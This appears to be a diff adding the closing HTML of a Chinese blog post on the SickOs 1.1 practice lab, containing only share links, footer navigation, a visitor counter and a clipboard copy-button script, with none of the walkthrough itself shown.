+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ta3shi.github.io/2025/06/03/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%9Asickos%201.1/&text=靶场实战：sickos 1.1"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ta3shi.github.io/2025/06/03/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%9Asickos%201.1/&title=靶场实战：sickos 1.1"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ta3shi.github.io/2025/06/03/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%9Asickos%201.1/&is_video=false&description=靶场实战：sickos 1.1"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=靶场实战：sickos 1.1&body=Check out this article: https://ta3shi.github.io/2025/06/03/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%9Asickos%201.1/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ta3shi.github.io/2025/06/03/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%9Asickos%201.1/&title=靶场实战：sickos 1.1"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ta3shi.github.io/2025/06/03/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%9Asickos%201.1/&title=靶场实战：sickos 1.1"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ta3shi.github.io/2025/06/03/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%9Asickos%201.1/&title=靶场实战：sickos 1.1"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ta3shi.github.io/2025/06/03/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%9Asickos%201.1/&title=靶场实战：sickos 1.1"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ta3shi.github.io/2025/06/03/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%9Asickos%201.1/&name=靶场实战：sickos 1.1&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ta3shi.github.io/2025/06/03/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%9Asickos%201.1/&t=靶场实战：sickos 1.1"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    ta3shi
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+      --><li><a href="/">Home</a></li><!--
+    --><!--
+      --><li><a href="/about/">About</a></li><!--
+    --><!--
+      --><li><a href="/tags/">Tags</a></li><!--
+    --><!--
+      --><li><a href="/categories/">Categories</a></li><!--
+    --><!--
+      --><li><a href="/search/">Search</a></li><!--
+    -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+  
+</footer>
+
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
